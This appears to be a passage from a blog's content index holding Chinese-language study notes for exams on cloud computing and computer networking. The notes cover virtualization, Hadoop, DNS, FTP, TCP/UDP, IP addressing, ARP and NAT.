title="云计算的两条底层技术路线"></a>云计算的两条底层技术路线</h2><ul><li>分布式计算：把一个任务分解成多个小人物，在不同的服务器进行计算，整合计算资源</li></ul><ul><li><p>虚拟化：提供Iaas虚机，分割计算资源</p><h2 id="VMM的分类-VMM-virtual-machine-monitor-虚拟化核心软件"><a href="#VMM的分类-VMM-virtual-machine-monitor-虚拟化核心软件" class="headerlink" title="VMM的分类 VMM(virtual machine monitor)虚拟化核心软件"></a>VMM的分类 VMM(virtual machine monitor)虚拟化核心软件</h2><p>管理虚拟环境、管理物理资源</p></li><li><p>所谓虚拟化，是指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虚拟化就是由位于下层的软件模块,通过向上一层软件模块</span><br><span class="line">提供一个与它原先所期待的运行环境 完全一致 的接口的方法,</span><br><span class="line">抽象出一个虚拟的软件或硬件接口,使得上层软件可以直接运行在虚拟环境上。</span><br></pre></td></tr></table></figure></li><li><p>虚拟化的优点:封装(逻辑化)\多实例–计算资源的充分利用率、绿色节能、降低成本\隔离\硬件兼容\虚拟化层特权</p></li><li><p>虚拟化的缺点:性能错误安全影响复杂：虚拟化层的引入增加了系统出错层面(如有些驱动无法加载)</p></li><li><p>虚拟平台：完全虚拟化 半虚拟化</p></li><li><p>实现结构 ：Hypervisor模型宿主模型混合模型</p><h2 id="IO虚拟化"><a href="#IO虚拟化" class="headerlink" title="IO虚拟化"></a>IO虚拟化</h2></li><li><p>发现虚拟设备</p></li><li><p>虚机加载驱动，通过vmm提供的后端接口驱动设备</p></li><li><p>后端驱动程序调用物理驱动程序管理物理IO设备</p></li></ul><p>设备模型指VMM中进行设备模拟,并处理所有设备请求和响应的逻辑模块</p><h2 id="ssh原理"><a href="#ssh原理" class="headerlink" title="ssh原理"></a>ssh原理</h2><ul><li><p>客户端向服务器端发出连接请求</p></li><li><p>服务器端向客户端发出自己的公钥</p></li><li><p>客户端使用服务器端的公钥加密通讯密钥然后发给服务器端</p></li><li><p>如果通讯过程被截获,由于窃听者即使获知公钥和经过公钥加密的内容,但不拥有私钥依然无法解密(RSA算法)</p></li><li><p>服务器端接收到密文后,用私钥解密,获知通讯密钥</p></li><li><p>ssh-keygen命令给服务器端产生公私钥密钥对</p></li><li><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2></li><li><p>HDFS</p></li><li><p>NameNode</p></li><li><p>DataNode</p></li><li><p>事务日志</p></li><li><p>映像文件</p></li><li><p>SecondaryNameNode</p></li><li><p>读取数据流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">客户端要访问HDFS中的一个文件</span><br><span class="line">首先从namenode获得组成这个文件的数据块位置列表</span><br><span class="line">根据列表知道存储数据块的datanode</span><br><span class="line">访问datanode获取数据</span><br><span class="line">Namenode并不参与数据实际传输</span><br></pre></td></tr></table></figure></li><li><p>冗余副本策略,所有数据块都有副本</p></li><li><p>心跳机制，保证数据一致性</p></li><li><p>机架策略</p></li></ul><h2 id="Hbase"><a href="#Hbase" class="headerlink" title="Hbase"></a>Hbase</h2><ul><li><p>HBase是一个分布式的、面向列的开源数据库</p></li><li><p>适合于非结构化数据存储的数据库</p></li><li><p>行键是数据行在表里的唯一标识</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 以表的形式存放数据</span><br><span class="line">* 表由行与列组成,每个列属于某个列族,由行和列确定的存储单元称为元素</span><br><span class="line">* 每个元素保存了同一份数据的多个版本,由时间戳来标识区分</span><br></pre></td></tr></table></figure></li><li><p>列表示为&lt;列族&gt;:&lt;限定符&gt;</p></li><li><p>Hbase在磁盘上按照列族存储数据,这种列式数据库的设计非常适合于数据分析</p></li><li><p>列族里的元素最好具有相同的读写方式(例如等长的字符串),以提高性能，可压缩</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2></li><li><p>把Linux的cgroup、namespace,chroot等容器底层技术进行封装抽象,为用户提供了创建和管理容器的便捷界面</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> Cloud Computing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理应用层复习</title>
      <link href="/2019/01/07/2019-01-07-%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2019/01/07/2019-01-07-%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测</p><a id="more"></a><ul><li>域名系统 DNS</li><li>文件传送协议</li><li>远程终端协议 TELNET</li><li>万维网 WWW</li><li>电子邮件</li><li>动态主机配置协议 DHCP</li><li>P2P 应用</li></ul><hr><p>#总结</p><ul><li>国家顶级域名 nTLD</li><li>通用顶级域名 gTLD</li><li>基础结构域名 (infrastructure domain)，<em>顶级域名只有一个,即 arpa</em></li><li>一个服务器所负责管辖的(或有权限的)范围叫<strong>区 (zone)</strong>。</li><li>每一个区设置相应的权限域名服务器,用来保存该区中的所有主机的域名到 IP 地址的映射。<br>根域名服务器共有 13 套装置,不是 13 个机器</li><li>可靠性：DNS 域名服务器都把数据复制到几个域名服务器来保存,其中的一个是主域名服务器,其他<br>的是辅助域名服务器<h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2></li><li>根域名服务器 最高层次的域名服务器,也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址<br>a.rootservers.net<br>b.rootservers.net</li><li>顶级域名服务器</li><li>权限域名服务器</li><li>本地域名服务器<h2 id="域名的解析过程"><a href="#域名的解析过程" class="headerlink" title="域名的解析过程"></a>域名的解析过程</h2></li><li>主机向本地域名服务器的查询一般都是采用递归查询</li><li>本地域名服务器向根域名服务器的查询通常是采用迭代查询。<h3 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h3></li><li><em>每个域名服务器都维护一个高速缓存*</em> ,存放最近用过<br>的名字以及从何处获得名字映射信息的记录</li></ul><hr><h1 id="文件传输-文件传送协议-FTP-File-Transfer-Protocol"><a href="#文件传输-文件传送协议-FTP-File-Transfer-Protocol" class="headerlink" title="文件传输 文件传送协议 FTP (File Transfer Protocol)"></a>文件传输 文件传送协议 FTP (File Transfer Protocol)</h1><ul><li>提供交互式的访问<h2 id="工作步骤"><a href="#工作步骤" class="headerlink" title="工作步骤"></a>工作步骤</h2></li><li>打开熟知端口(端口号为 21),使客户进程能够连接上。</li><li>等待客户进程发出连接请求。</li><li>启动从属进程来处理客户进程发来的请求。</li><li>回到等待状态,继续接受其他客户进程发来的请求。<h2 id="控制连接和数据连接"><a href="#控制连接和数据连接" class="headerlink" title="控制连接和数据连接"></a>控制连接和数据连接</h2>控制连接在整个会话期间一直保持打开，实际用于传输文件的是“数据连接”<h1 id="超媒体超文本"><a href="#超媒体超文本" class="headerlink" title="超媒体超文本"></a>超媒体超文本</h1></li></ul>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理运输层复习</title>
      <link href="/2019/01/06/2019-01-06-%E4%BC%A0%E8%BE%93%E5%B1%82/"/>
      <url>/2019/01/06/2019-01-06-%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测</p><a id="more"></a><ul><li>用户数据报协议 UDP</li><li>传输控制协议 TCP</li><li>可靠传输的工作原理</li><li>TCP 报文段的首部格式</li><li>TCP 的流量控制、拥塞控制</li><li>TCP 的运输连接管理</li></ul><hr><h1 id="TCP-UDP"><a href="#TCP-UDP" class="headerlink" title="TCP  UDP"></a>TCP  UDP</h1><ul><li>传输的数据单位：运输协议数据单元 TPDU (Transport Protocol Data Unit)</li></ul><h2 id="用户数据报协议UDP-User-Datagram-Protocol"><a href="#用户数据报协议UDP-User-Datagram-Protocol" class="headerlink" title="用户数据报协议UDP (User Datagram Protocol)"></a>用户数据报协议UDP (User Datagram Protocol)</h2><ul><li><strong>无连接</strong> </li><li>├── 在传送数据之前不需要先建立连接</li><li>├── 对方的运输层在收到 UDP 报文后,不需要给出任何确认。</li><li>└── 不提供可靠交付<br>与IP数据报的区别：IP需要经过存储转发过程、UDP在运输层的端到端（进程）的逻辑信道中传送，只比IP数据报服务多了</li><li>复用分用</li><li>差错检测<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3></li><li>UDP 是无连接的,发送数据之前不需要建立连接,因此减少了开销和发送数据之前的时延</li><li>UDP 使用尽最大努力交付,即不保证可靠交付</li><li>UDP 是面向报文的,UDP 一次交付一个完整的报文。</li><li>UDP 没有拥塞控制</li><li>UDP 支持一对一、一对多、多对一和多对多的交互通信,全双工</li><li>UDP 的首部开销小,<strong>只有 8 个字节</strong>,比TCP 的 20 个字节的首部要短。<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/UDP.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="传输控制协议-TCP-Transmission-Control-Protocol"><a href="#传输控制协议-TCP-Transmission-Control-Protocol" class="headerlink" title="传输控制协议 TCP (Transmission Control Protocol)"></a>传输控制协议 TCP (Transmission Control Protocol)</h2></li><li>面向连接的运输层协议</li><li>TCP 连接只能有两个端点</li><li>提供可靠交付</li><li>提供全双工通信</li><li>面向字节流<h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3>根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节<br>(UDP 发送的报文长度是应用进程给出的)</li></ul><h2 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h2><ul><li><p>停止等待协议</p></li><li><p>连续ARQ协议</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发送方维持的发送窗口,它的意义是:</span><br><span class="line">位于发送窗口内的分组都可连续发送出去,而不需要等待对方的确认。</span><br><span class="line">这样,信道利用率就提高了。</span><br><span class="line">连续 ARQ 协议规定,发送方每收到一个确认,就把发送窗口向前滑动一个分组的位置。</span><br><span class="line"></span><br><span class="line">接收方一般采用累积确认的方式。</span><br><span class="line">即不必对收到的分组逐个发送确认,而是对按序到达的最</span><br><span class="line">后一个分组发送确认,</span><br><span class="line">这样就表示:到这个分组为止的所有分组都已正确收到了。</span><br></pre></td></tr></table></figure></li><li><p>确认丢失<strong>不必重传</strong></p></li><li><p>不能向发送方反映出接收方已经正确收到的所有分组的信息</p><h3 id="GBN重传"><a href="#GBN重传" class="headerlink" title="GBN重传"></a>GBN重传</h3></li><li><p>可以在连续收到好几个正确的确认帧后，才对最后一个数据帧发确认信息</p></li><li><p>这就是说，对某一数据帧的确认就表明该数据帧和这以前所有的数据帧均已正确无误地收到了。</p></li><li><p>后退N帧协议的接受窗口为1，可以保证按序接受数据帧。若采用n个比特对帧编号，则其发送窗口的尺寸Wt应满足：1&lt;=Wt&lt;=2^n-1</p></li><li><p>ACK(n+1)表示对第n号帧的确认，表明接受方已正确收到第n帧及以前的所有帧</p><h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>数据链路层采用了后退N帧(GBN)协议，发送方已经发送了编号为0～7的帧。当计时器超时时，若发送方只收到0、2、3号帧的确认，则发送方需要重发的帧数是( )。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：根据后退N帧协议，接收方的窗口为“<span class="number">1</span>”，如果发送方收到了<span class="number">3</span>号帧的确认，则说明<span class="number">0</span>、<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>号帧都已经发送成功，所以只需要重发<span class="number">4</span>、<span class="number">5</span>、<span class="number">6</span>、<span class="number">7</span>号帧即可。</span><br></pre></td></tr></table></figure></li></ul><h2 id="TCP可靠重传"><a href="#TCP可靠重传" class="headerlink" title="TCP可靠重传"></a>TCP可靠重传</h2><ul><li>字节为单位的滑动窗口 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">发送缓存：存放①发送应用程序传送给发送方 TCP 准备发送的数据</span><br><span class="line">        ②TCP 已发送出但尚未收到确认的数据</span><br><span class="line">* 超时重传时间</span><br><span class="line">* 选择确认SACK</span><br><span class="line">## TCP流量控制</span><br><span class="line">出现拥塞的原因:</span><br><span class="line">∑对资源需求 &gt; 可用资源</span><br><span class="line"></span><br><span class="line">* 增加资源不能解决拥塞，重传也不行，反而可能加剧</span><br><span class="line">* 拥塞控制：为了防止过多数据注入到网络中，一个全局性的过程</span><br><span class="line">* 流量控制：点对通信量的控制，一个端到端的过程，抑制发送端发送数据的速率,以便使接收端来得及接收</span><br><span class="line">开环控制、闭环控制。</span><br><span class="line">### tcp拥塞控制方法（闭环控制</span><br><span class="line">TCP发送方维持一个拥塞窗口 CWND(Congestion Window)</span><br><span class="line">*判断方式 有两个：*</span><br><span class="line">* 使用**重传定时器**定时，若超时，重传；</span><br><span class="line">* 收到三个重复的ACK</span><br><span class="line">算法有四种，慢开始，&lt;blue&gt;拥塞避免&lt;/blue&gt;、快重传、快恢复</span><br><span class="line">* 拥塞窗口 cwnd 设置：最大报文段 SMSS 窗口数值</span><br><span class="line">* 慢开始门限 ssthresh(状态变量):防止拥塞窗口cwnd 增长过大引起网络拥塞。</span><br></pre></td></tr></table></figure></li></ul><p>当 cwnd &lt; ssthresh 时,使用慢开始算法。<br>当 cwnd &gt; ssthresh 时,停止使用慢开始算法而改<br>用拥塞避免算法。<br>当 cwnd = ssthresh 时,既可使用慢开始算法,也<br>可使用拥塞避免算法。</p><pre><code>* 3ACK  拥塞避免，变成一半，然后拥塞避免，线性增加* 超时  cwnd=1，慢开始，从1开始增加### 快重传：让发送方尽早知道发生了个别报文段的丢失发送方只要一连收到三个重复确认,就知道接收方确实没有收到报文段,因而应当立即进行重传(即“快重传”),这样就不会出现超时,发送方也不就会误认为出现了网络拥塞{% image /img/FN.png '' '' %}## TCP三次握手发送链接请求报文段* A ---------------------------------------- B* A发请求报文段，同步位SYN=1，选择序号seq=x表示第一个数据字节的序号为x* B发确认报文段，同步位SYN=1，确认位ACK=1，确认号ack=x+1，自己的数据序号seq=y* A发确认报文段，确认位ACK=1，数据序号seq=x+1，确认号ack=y+1发送链接释放报文段* A ---------------------------------------- B* A发请求报文段，FIN=1，选择序号seq=u* B发确认报文段，ACK=1，确认号ack=u+1，数据序号seq=v，A半关闭* B发确认报文段，FIN=1，ACK=1，确认号ack=u+1，数据序号seq=w* A发确认报文段，ACK=1，确认号ack=w+1，数据序号seq=u+1，A关闭**其中，A 必须等待 2MSL 的时间*** 保证 A 发送的最后一个 ACK 报文段能够到达 B。* A 在发送完最后一个 ACK 报文段后,再经过时间 2MSL,就可以使本连接持续的时间内所产生的所有报文段,都从网络中消失。这样就可以使下一个新的连接中不会出现这种旧的连接请求报文段。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理网络层复习</title>
      <link href="/2019/01/05/2019-01-05-%E7%BD%91%E7%BB%9C%E5%B1%82%E5%A4%8D%E4%B9%A0/"/>
      <url>/2019/01/05/2019-01-05-%E7%BD%91%E7%BB%9C%E5%B1%82%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>限于IP层</p><a id="more"></a><p>网络层向运输层提供的服务</p><h2 id="面向连接-无连接"><a href="#面向连接-无连接" class="headerlink" title="面向连接  无连接"></a>面向连接  无连接</h2><h1 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 地址解析协议 ARP(Address Resolution Protocol)** </span><br><span class="line">* 网际控制报文协议 ICMP(Internet Control Message Protocol)**</span><br><span class="line">* 网际组管理协议 IGMP(Internet Group Management Protocol)**</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IPands.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p><strong>互联时使用中间设备</strong></p><ul><li>物理层中继系统:转发器 (repeater)。</li><li>数据链路层中继系统:网桥 或 桥接器 (bridge)。</li><li>网络层中继系统:路由器 (router)。</li><li>网桥和路由器的混合物:桥路器 (brouter)。</li><li>网络层以上的中继系统:网关 (gateway)。<h2 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a>IP地址分类</h2></li><li><em>A B C三类*</em><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络号|主机号  一共<span class="number">32</span>位</span><br><span class="line">IPv6 <span class="number">128</span>位</span><br><span class="line">IP 地址 ::= &#123; &lt;网络号&gt;, &lt;主机号&gt;&#125;</span><br><span class="line">A类地址 <span class="number">8</span> ，<span class="number">24</span> [最大可指派网络<span class="number">126</span> (<span class="number">2</span>^<span class="number">7</span> -<span class="number">1</span> -<span class="number">1</span>)]</span><br><span class="line">B类地址 <span class="number">16</span>，<span class="number">16</span> [最大可指派网络(<span class="number">2</span>^<span class="number">14</span> -<span class="number">1</span> -<span class="number">1</span>)]</span><br><span class="line">C类地址 <span class="number">24</span>, <span class="number">8</span>  [最大可指派网络(<span class="number">2</span>^<span class="number">21</span> -<span class="number">1</span> -<span class="number">1</span>)]</span><br></pre></td></tr></table></figure></li></ul><p>IP地址与硬件地址报文、数据帧的区别</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IPandHard.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="其他分类方式"><a href="#其他分类方式" class="headerlink" title="其他分类方式"></a>其他分类方式</h3><ul><li><p>子网划分</p></li><li><p>构成超网</p><h2 id="ARP协议-解决同一个局域网的主机或路由器的IP：MAC问题"><a href="#ARP协议-解决同一个局域网的主机或路由器的IP：MAC问题" class="headerlink" title="ARP协议,解决同一个局域网的主机或路由器的IP：MAC问题"></a>ARP协议,解决同一个局域网的主机或路由器的IP：MAC问题</h2></li><li><p>不管网络层使用的是什么协议,在实际网络的链路上传送数据帧时,最终还是必须使用<strong>硬件地址</strong>。</p></li><li><p>ARP 高速缓存 (ARPcache),里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。<br>格式 &lt; IP address;MAC address;TTL &gt; TTL (Time To Live):地址映射有效时间 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">存放最近获得的 IP 地址到 MAC 地址的绑定,以减少 ARP 广播的数量。</span><br><span class="line">为了减少网络上的通信量,主机 A 在发送其ARP请求分组时,就将自己的 IP 地址</span><br><span class="line">到硬件地址的映射写入 ARP 请求分组。</span><br><span class="line">当主机 B 收到 A 的 ARP 请求分组时,就将主机 A的这一地址映射写入</span><br><span class="line">主机 B 自己的 ARP高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。</span><br></pre></td></tr></table></figure></li><li><p>ARP请求分组<br>包含发送方硬件地址 / 发送方IP 地址/目标方硬件地址(未知时填 0)/ 目标方IP 地址。</p></li><li><p>本地广播 ARP 请求</p></li><li><p>ARP 响应分组 包含发送方硬件地址/发送方IP地址/目标方硬件地址/目标方 IP 地址。</p></li></ul><h2 id="IP数据报分片"><a href="#IP数据报分片" class="headerlink" title="IP数据报分片"></a>IP数据报分片</h2><p>数据报字段格式</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IPziduan.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>转发过程：根据IP数据报的目的地址就可以确定下一跳路由器<br>分组转发算法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) 从数据报的首部提取目的主机的 IP 地址 D, 得出目的网络地址为 N。</span><br><span class="line">(<span class="number">2</span>) 若网络 N 与此路由器直接相连,则把数据报直接交付目的主机D;</span><br><span class="line">否则是间接交付,执行(<span class="number">3</span>)。</span><br><span class="line">(<span class="number">3</span>) 若路由表中有目的地址为 D 的特定主机路由,则把数据报传送给</span><br><span class="line">路由表中所指明的下一跳路由器;否则,执行(<span class="number">4</span>)。</span><br><span class="line">(<span class="number">4</span>) 若路由表中有到达网络 N 的路由,则把数据报传送给路由表指</span><br><span class="line">明的下一跳路由器;否则,执行(<span class="number">5</span>)。</span><br><span class="line">(<span class="number">5</span>) 若路由表中有一个默认路由,则把数据报传送给路由表中所指</span><br><span class="line">明的默认路由器;否则,执行(<span class="number">6</span>)。</span><br><span class="line">(<span class="number">6</span>) 报告转发分组出错。</span><br></pre></td></tr></table></figure></li></ul><h2 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h2><p>从 主机号借用几位 划分子网号</p><ul><li>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}<br>与上述转发过程不同点：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)路由器在收到 IP 数据报后,再按目的网络号 net-id 和子网号 subnet-id 找到目的子网</span><br><span class="line"><span class="number">2</span>)通过子网掩码与IP地址进行&amp;操作，匹配，则说明子网掩码代表的这个子网就是目的网络。</span><br></pre></td></tr></table></figure></li></ul><h2 id="CIDR"><a href="#CIDR" class="headerlink" title="CIDR"></a>CIDR</h2><ul><li>无分类编址 CIDR，IP地址 ::= {&lt;网络前缀&gt;, &lt;主机号&gt;},中间使用符号‘/’来表示网络前缀<h3 id="构成超网"><a href="#构成超网" class="headerlink" title="构成超网"></a>构成超网</h3>路由聚合 有利于减少路由器之间选择的次数，从而提高性能。</li><li>CIDR记法 0 可以省略</li></ul><h3 id="最长前缀匹配"><a href="#最长前缀匹配" class="headerlink" title="最长前缀匹配"></a>最长前缀匹配</h3><p><strong>原因</strong>：使用 CIDR 时,路由表中的每个项目由“网络前缀”和“下一跳地址”组成。<br>在查找路由表时可能会得到不止一个匹配结果<br><strong>方案</strong>：在匹配结果中选择最长网络前缀的路由。</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><ul><li>报文格式</li><li>ICMP首部检验和<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/ICMP.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h2></li><li>内部网关协议　RIP   ———|</li><li>内部网关协议　OSPF  ———|–IGP</li><li>外部网关协议  BGP 将路由选择协议传递到另一个自制系统中<br>使用4种报文<br>打开 更新 保活 keepalive  通知 notification</li></ul><p>RIP<br>(1)仅和相邻路由器交换信息。<br>(2)交换的信息是当前本路由器所知道的全部信息,即自己的路由表。<br>(3)按固定的时间间隔交换路由信息,例如,每隔30秒。<br>当网络拓扑发生变化时,路由器也及时向相邻路由器通告拓扑变化后的路由信息。</p><h2 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h2><ul><li><p>在 IPv6 数据报要进入IPv4网络时,把 IPv6 数据报封装成为 IPv4 数据报,<br>整个的 IPv6 数据报变成了 IPv4 数据报的数据部分。</p></li><li><p>当 IPv4 数据报离开 IPv4 网络中的隧道时,再把数据部分(即原来的 IPv6 数据报)<br>交给主机的 IPv6 协议栈。</p></li></ul><h2 id="NAT技术-网络地址转换-Network-Address-Translation"><a href="#NAT技术-网络地址转换-Network-Address-Translation" class="headerlink" title="NAT技术 网络地址转换(Network Address Translation)"></a>NAT技术 网络地址转换(Network Address Translation)</h2><p><strong>解决</strong>：在专用网上使用专用地址的主机如何与互联网上的主机通信(并不需要加密)的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">内部主机 A 用本地地址 IP A 和互联网上主机 B 通信所</span><br><span class="line">发送的数据报必须经过 NAT 路由器。</span><br><span class="line"></span><br><span class="line">NAT 路由器将数据报的源地址 IP A 转换成全球地址IP G ,</span><br><span class="line">并把转换结果记录到NAT地址转换表中,目的地址 IP B 保持不变,然后发送到互联网。</span><br><span class="line"></span><br><span class="line">NAT 路由器收到主机 B 发回的数据报时,知道数据报中的源地址是 IP B 而目的地址是 IP G 。</span><br><span class="line"></span><br><span class="line">根据 NAT 转换表,NAT 路由器将目的地址 IP G 转换为IP A ,转发给最终的内部主机 A。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理物理层链路层复习</title>
      <link href="/2019/01/05/2019-01-05-%E7%89%A9%E7%90%86%E5%B1%82%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2019/01/05/2019-01-05-%E7%89%A9%E7%90%86%E5%B1%82%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>限于物理层、链路层 </p><a id="more"></a><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><h2 id="屏蔽双绞线-STP-Shielded-Twisted-Pair"><a href="#屏蔽双绞线-STP-Shielded-Twisted-Pair" class="headerlink" title="屏蔽双绞线 STP (Shielded Twisted Pair)"></a>屏蔽双绞线 STP (Shielded Twisted Pair)</h2><h2 id="无屏蔽双绞线-UTP-Unshielded-Twisted-Pair"><a href="#无屏蔽双绞线-UTP-Unshielded-Twisted-Pair" class="headerlink" title="无屏蔽双绞线 UTP (Unshielded Twisted Pair)"></a>无屏蔽双绞线 UTP (Unshielded Twisted Pair)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">室内传送数据的无屏蔽双绞线和屏蔽双绞线的标准 EIA/TIA-568。</span><br></pre></td></tr></table></figure><h2 id="多模光纤"><a href="#多模光纤" class="headerlink" title="多模光纤"></a>多模光纤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以存在多条不同角度入射的光线在一条光纤中传输。</span><br><span class="line">这种光纤就称为多模光纤。</span><br></pre></td></tr></table></figure><h2 id="单模光纤"><a href="#单模光纤" class="headerlink" title="单模光纤"></a>单模光纤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，</span><br><span class="line">它可使光线一直向前传播，而不会产生多次反射,这样的光纤称为单模光纤</span><br></pre></td></tr></table></figure><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1) 通信容量非常大。</span><br><span class="line">(2) 传输损耗小，中继距离长。</span><br><span class="line">(2) 抗雷电和电磁干扰性能好。</span><br><span class="line">(3) 无串音干扰，保密性好。</span><br><span class="line">(4) 体积小，重量轻。</span><br><span class="line">TIPS:光纤应用于：**企业网络 FTTH 和访问网络 长途网络 水下网络**</span><br></pre></td></tr></table></figure><h3 id="自由空间称为“非导引型传输媒体”。"><a href="#自由空间称为“非导引型传输媒体”。" class="headerlink" 